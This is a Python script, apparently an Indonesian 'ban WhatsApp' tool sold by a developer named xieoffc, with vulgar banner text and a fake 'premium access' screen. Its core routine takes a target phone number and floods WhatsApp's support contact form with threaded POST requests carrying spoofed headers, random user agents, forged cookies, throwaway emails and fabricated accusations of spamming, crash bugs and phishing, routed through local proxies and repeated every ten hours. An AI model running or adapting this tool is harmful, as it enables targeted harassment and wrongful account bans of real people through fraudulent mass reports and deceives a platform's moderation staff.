# ======== YANG RECODE YAPIT HARGAIN GW ======== #
import os
import time
import requests
from rich.console import Console
from rich.panel import Panel
from rich.progress import Progress, BarColumn, TextColumn, SpinnerColumn
from rich.align import Align
from rich.prompt import Prompt
import json
import subprocess
import random
import threading
from datetime import datetime, timedelta
from fake_useragent import UserAgent
import string

console = Console()

USER_LOGO = """
[bold cyan]                      °/ìkµô¢*:                              
                            `TDÞÜëé8ÿbë¶XHÄÀÜ{                          
                          ‰ñèÚÚð¶øðGgÐŠ¶ßmâãXKAk}                       
                        ú¥ÇUškábk4aômApÛpã€GÔqXÕÖšÌ                     
                      1Îc+/[ílí=>}(+º//^››¹¦×ïI0äãÄSi                   
                     OL{{?1cjïì†*»÷¡        `  ´·›½Óœž                  
                    TÝ<iï¤%tíi?*/«¬|           `´´´«§ê®                 
                   SF‡=jJnòƒri×{««««           `   ·ižÔ4                
                  úèŸ%ƒ¢óL±CJ<?{))(»            ````‹s¥à                
                 ¯ÖÞS½s@Ì@¢tï†+«•+(/            ```´¸}ùk:               
                 fÿb¾öó3Ïnuî7+«!÷«+«          `´`` ´·—‡4°               
                 Uýñ™óÌ@nƒî1jíií//)«           ````` …(©‘               
                 §åµs@wàZûÝÇáše¾VI[î      ’)oîl1¤{˜¸´ ›%¨               
                 TñÍ¼L6Öð€p8ÖåÖáŸú@Ï°’ˆ’º(IúeŸûTw@=­` ‚ì                
                 s¥ÏnùTDÞkO2©5xŸžYîj¡‹;¬öV¼¼ò¼Jo¿»ª’¸¸‘(                
                  Pö356žäá3€ßVÍ£Îò+/¯·‘>†î2Isâévôó~~’˜›ì‹º              
                ˜!‰¼ö£YVL&x2V©ÍVCc»!° ´­­²÷|}71i|÷÷„‹‚›–^o              
                ’Yúnos‰¤tJz¤ovIu‡1«!‘ ´˜ˆ¸ˆ­~^^„°‚ˆ‚˜˜;””­              
                 ïÌ¼<ƒ¼r>{)*(*íIï<!¯´  ˆ’˜        `…ˆ˜°¬›               
                  Ì½<ƒ@ö¤7/¬¬•?†lí!!    `‘        ¨´ …”³’               
                  +tíî32Ío[/|¬½šãä4x:¸‘:‚’ˆ     `¸¨  :¬–                
                  `¼oînü&ÏI×•/tµTç03e™Oå§‰­·…·¸˜’¸`  ;¹                 
                   ’ío‰wawnviïl½0w@½¬^¦J‡?‹¸·ˆ‚::’·  ~‘                 
        `           ¨í‡Ïúõw‰‡núùç©u{~‘¹ª¬7½t/²‘’˜¸·                     
      `  `           ·%Ì25a46Îµhàà§9¼z¢@ÌC%ƒní­ˆ¸·                      
                      ×öL™õûñû6ùuì+)º!)*[{)[%Ì»ˆ¸·                      
                      »%3©¾eµy5ùYsI1*)»!^“º¹•‡~›’·                      
 !    *  »    7¨ ÷   {†ó32ôOOxxµSÇáèíj}—²›¹÷ö¤ª“:                       
 ¡;  „)  „/  „^’  ¬;² ;©™£úúžTµx4™V©¹‘‚:­~*>a[²“‹z–                     
 ¸ ˜– „  ² ¬’ ´’   ¦  ¨£fÎçÎZ$Þ¥èè8â×{j‰Ín™9Í?«¡…^Kù                    
   ’  ˜  ¸  ‘  ¨   ‹   0õµOúeð€ŠŠÔŠÀûäèÓèbPÍ[iï‚  SÔú                   
                       nô¾eUykÔŽRÁ#N4OÎ2Í‡îoz=    ÷ÕÚÝ7                 
       ‚               =a4yTSÝÇÙÕÐŽœžSee¾¾yü(      ¶8Ö§Ýáÿù/            
              ’        íV™&õ69®àZZä¥±0©fžžu        d8ÙÒDbÞÙëdÿO¤¦       
          `   ‚…»{«•  ‘sÏVYw2ôyU9®UŸ½ò4k£         ·8ÚdÞbÿÞýë88dèÞbZ®õ[  
         ·º»=rt1×}(†´  •Í333LVùfµyxÎ `)           ¡ø¶8ÓåÿÞèèýÙëdýÓÖÿbFñZ
     ´¹*ïlvrîli}¿ivr¬    ¬33óÏL©çü&úÍLòv³         ~d8é$ýÞÒÖÓÓÓý$$ÙÙèÓÖÖÓ
´¯+7=vv1vrjrrƒïlt¤trt       i‰¢öÏ3±Lçž5¨›Ï3       ²dÚÚ$dÙÞbÒÖÓÓ$8$$ÙÓÓÓÓ
ìlv1jjjjjrîjrr¤%¤Irí«          ˜|iƒCäfÏ;z» ¬      †ÙÜÚëdddëÜð€ßødd$ddddÙ
"""

MAIN_LOGO = USER_LOGO

class AplikasiPengguna:
    def __init__(self):
        pass
        
    def clear_screen(self):
        os.system('cls' if os.name == 'nt' else 'clear')
    
    def show_header(self, subtitle=""):
        self.clear_screen()
        console.print(
            Panel(
                Align.center(USER_LOGO),
                title="[bold cyan]🔥 MAKLO HEKER BAPAK LU ATACKER 🔥[/bold cyan]",
                subtitle=f"[bold yellow]{subtitle}[/bold yellow]",
                style="bold green"
            )
        )
    
    def tampilkan_informasi_fitur(self):
        fitur_content = """[bold cyan]🔥 FITUR PREMIUM KONTOL ACCESS 🔥[/bold cyan]

[bold red]• 🚫 SC BAN SPAM[/bold red]
[bold red]• 🔒 SC BAN OTW PERMANEN[/bold red]
[bold red]• ⚡ SC BAN PERMANEN[/bold  red]
[bold red]• 👑 MURID BANNED WA[/bold red]
[bold red]• 🔄 FREE UPDATE UNLIMITED[/bold red]
[bold red]• 🔥 PENGGUNAAN UNLIMITED[/bold red]
[bold red]• 🍁 BISA BUKA JASA SENDIRI[/bold red]
[bold red]• 🔐 BYPASS AI SUPPORT[/bold red]
[bold red]• 📤 INJECTED WHATSAPP[/bold red]

[bold yellow]👨‍💻 Developer: [bold white]xieoffc[/bold white]
[bold blue]📱 TikTok: [bold white]@xieoffc[/bold white]  
[bold magenta]📧 Telegram: [bold white]@xieoffc[/bold white]"""

        console.print(
            Panel(
                fitur_content,
                title="[bold white]FITUR PREMIUM KONTOL[/bold white]",
                style="bold magenta"
            )
        )
    
    def loading_simulation(self):
        with Progress(
            SpinnerColumn("dots", style="bold cyan"),
            TextColumn("[bold green]SABAR LOADING ...[/bold green]"),
            BarColumn(bar_width=40, complete_style="bold cyan"),
            transient=True,
        ) as progress:
            task = progress.add_task("", total=100)
            for i in range(100):
                progress.update(task, advance=1)
                time.sleep(0.02)
    
    def run_authentication(self):
        self.show_header()
        self.tampilkan_informasi_fitur()
        
        console.print("\n")
        self.loading_simulation()
        
        console.print(
            Panel(
                "[bold yellow]✅ SYSTEM READY - OPEN ACCESS ACTIVATED\n\n"
                "✅ Premium features unlocked without authentication\n"
                "✅ Direct access to ban system[/bold yellow]",
                title="[bold green]ACCESS GRANTED[/bold green]",
                style="bold green"
            )
        )
        Prompt.ask("\n[bold white]ENTER[/bold white] To Continue ")
        return True

    def run_script_utama(self):
        self.clear_screen()
        self.main_script()
    
    def main_script(self):
        # YOUR COMPLETE ORIGINAL BAN SCRIPT CODE - 100% UNCHANGED
        limit_hours = 10
        log_file = "hs.txt"

        def clear():
            os.system('clear' if os.name == 'posix' else 'cls')

        def stp(port):
            if not os.path.exists("/data/data/com.termux/files/usr/bin/tinyproxy"):
                os.system("pkg install tinyproxy -y")
            config_path = f"/data/data/com.termux/files/usr/etc/tinyproxy_{port}.conf"
            if not os.path.exists(config_path):
                os.system(f"echo 'Port {port}\nAllow 127.0.0.1' > {config_path}")
            subprocess.Popen(["tinyproxy", "-c", config_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(2)
            return f"127.0.0.1:{port}"

        def vp(proxy):
            try:
                test_url = "http://httpbin.org/ip"
                proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
                r = requests.get(test_url, proxies=proxies, timeout=10)
                return r.status_code == 200
            except:
                return False

        def rua():
            return UserAgent().random

        def rc():
            csrf_token = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
            session_id = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
            return {
                'wa_csrf': csrf_token,
                'wa_lang_pref': 'id',
                'wa_ul': session_id
            }

        def rs(length=10):
            return ''.join(random.choice("abcdefghijklmnopqrstuvwxyz0123456789") for _ in range(length))

        def sr(pn, proxies):
            url = 'https://www.whatsapp.com/contact/noclient/async/new/'
            pesan_variatif = [
                f"Nomer ini [ +62{pn} ] Melakukan SPAMING berlebihan menggunakan bot, mohon di beri peringatan segera!",
                f"Nomer ini [ +62{pn} ] Melakukan penyalah gunaan whatsapp dengan menggunakan bot yang di modifikasi agar daoat mengirimkan bug ke nomer saya hingga whatsapp saya crash, Mohon di beri sanksi!",
                f"Nomer ini [ +62{pn} ] Melakukan tindakan yang tidak seharusnya di lakukan, Pengguna ini melakukan pengiriman pesan yang merusak whatsapp saya, Tolong di periksa dan di beri tindakan yang seharusnya di dapat.",
                f"Nomer ini [ +62{pn} ] Melakukan pengiriman pesan dengan memberi link ke akun saya yang ternyata link itu adalah sebuah phising, link tersebut adalah https://mfacebookcom.vercel.app/ Mohon di beri sanksi segera!"
            ]
            headers = {
                'authority': 'www.whatsapp.com',
                'accept': '/',
                'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://www.whatsapp.com',
                'referer': 'https://www.whatsapp.com/contact/?subject=messenger',
                'sec-ch-ua': f'"{random.choice(["Not-A.Brand", "Chromium"])}";v="{random.randint(90, 99)}", "Chromium";v="{random.randint(110, 124)}"',
                'sec-ch-ua-mobile': random.choice(['?0', '?1']),
                'sec-ch-ua-platform': f'"{random.choice(["Windows", "Android", "iOS"])}"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': rua(),
                'x-asbd-id': str(random.randint(100000, 999999)),
                'x-fb-lsd': 'AVoCvX9IGCU'
            }

            proxy = random.choice(proxies)
            proxies_dict = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
            data = {
                'country_selector': 'ID',
                'email': f'{rs()}@tempmail.com',
                'email_confirm': f'{rs()}@tempmail.com',
                'phone_number': pn,
                'platform': random.choice(['WHATS_APP_WEB_DESKTOP', 'WHATS_APP_ANDROID']),
                'your_message': random.choice(pesan_variatif),
                'step': 'submit',
            }

            try:
                response = requests.post(url, headers=headers, data=data, proxies=proxies_dict, cookies=rc(), timeout=10)
                if response.status_code == 200:
                    console.print(f"\n[bold cyan]╭───────────╯\n╰─> [ 200 ] : +62{pn}[/bold cyan]")
                else:
                    console.print(f"\n[bold red]╭───────────╯\n╰─> [ {response.status_code} ][/bold red]")
            except Exception as e:
                console.print(f"\n[bold red]╭───────────╯\n╰─> [ {e} ][/bold red]")

        def load_log():
            if os.path.exists(log_file):
                with open(log_file, "r") as f:
                    try:
                        return json.load(f)
                    except:
                        return {}
            return {}

        def save_log(pn):
            log_data = load_log()
            log_data[pn] = datetime.now().isoformat()
            with open(log_file, "w") as f:
                json.dump(log_data, f)

        def countdown_and_restart(sisa_waktu):
            total = int(sisa_waktu.total_seconds())
            try:
                from rich.live import Live
                from rich.text import Text
                
                countdown_text = Text("", style="bold yellow")
                
                with Live(countdown_text, refresh_per_second=4, console=console) as live:
                    while total > 0:
                        jam, sisa = divmod(total, 3600)
                        menit, detik = divmod(sisa, 60)
                        countdown_text = Text(f"[ SPAM LAGI DALAM ] : {jam:02}:{menit:02}:{detik:02}", style="bold yellow")
                        live.update(countdown_text)
                        time.sleep(1)
                        total -= 1
                
                console.print("[bold green]╭───────────╯\n╰─> [ START SPAM REPORT ][/bold green]\n")
                main()
            except ImportError:
                # Fallback jika rich.live tidak tersedia
                try:
                    while total > 0:
                        jam, sisa = divmod(total, 3600)
                        menit, detik = divmod(sisa, 60)
                        print(f"\r[ SPAM LAGI DALAM ] : {jam:02}:{menit:02}:{detik:02}", end="", flush=True)
                        time.sleep(1)
                        total -= 1
                    print("\n")
                    console.print("[bold green]╭───────────╯\n╰─> [ START SPAM REPORT ][/bold green]\n")
                    main()
                except KeyboardInterrupt:
                    console.print("\n[bold red]╭───────────╯\n╰─> [ DIHENTIKAN ][/bold red]")
            except KeyboardInterrupt:
                console.print("\n[bold red]╭───────────╯\n╰─> [ DIHENTIKAN ][/bold red]")

        def main():
            clear()
            console.print(Panel(MAIN_LOGO, style="bold red")) 
            console.print(Panel(
                "[bold white][[bold red]+[bold white]] [bold green]SPAM REPORT BANNED WHATSAPP PREMIUM    [bold white][[bold red]+[bold white]]\n"
                "[bold white][[bold red]+[bold white]] [bold green]MASUKAN NOMER TARGET AWALAN DENGAN 8XXX [bold white][[bold red]+[bold white]]\n"
                "[bold white][[bold red]+[bold white]] [bold green]SPAM SEWAJARNYA AJA JANGAN BERLEBIHAN!  [bold white][[bold red]+[bold white]]\n"
                "[bold yellow]👨‍💻 Developer: XieOffc | 📱 TikTok: @pias22333 | 📧 Telegram: @xieoffc[/bold yellow]",
                style="bold red"
            ))
            console.print("[bold cyan]╭──────────────────────────────────────────────")
            pn = console.input("[bold cyan]╰─> [ +62 ] : [/bold cyan]")

            if not pn.isdigit() or not pn.startswith("8") or len(pn) < 9:
                console.print("[bold red]╰─> [ MASUKAN NOMER DENGAN BENAR! AWALI 8XX ][/bold red]")
                return

            log_data = load_log()
            if pn in log_data:
                last_spam = datetime.fromisoformat(log_data[pn])
                waktu_sisa = timedelta(hours=limit_hours) - (datetime.now() - last_spam)
                if waktu_sisa.total_seconds() > 0:
                    countdown_and_restart(waktu_sisa)
                    return

            save_log(pn)

            ports = [8888 + i for i in range(10)]
            proxies_list = []
            for port in ports:
                proxy = stp(port)
                if vp(proxy):
                    proxies_list.append(proxy)

            if not proxies_list:
                console.print("[bold red]PROXY MATI SEMUA SERVER OFF[/bold red]")
                return

            def spam_job():
                sr(pn, proxies_list)

            with Progress() as progress:
                task = progress.add_task("[cyan]PROSES BANG |", total=10)
                threads = []
                for _ in range(10):
                    t = threading.Thread(target=spam_job)
                    t.start()
                    threads.append(t)
                    progress.update(task, advance=1)
                    time.sleep(random.randint(1, 5))
                for t in threads:
                    t.join()

            countdown_and_restart(timedelta(hours=limit_hours))

        main()

    def run(self):
        if self.run_authentication():
            self.run_script_utama()

if __name__ == "__main__":
    app = AplikasiPengguna()
    app.run()
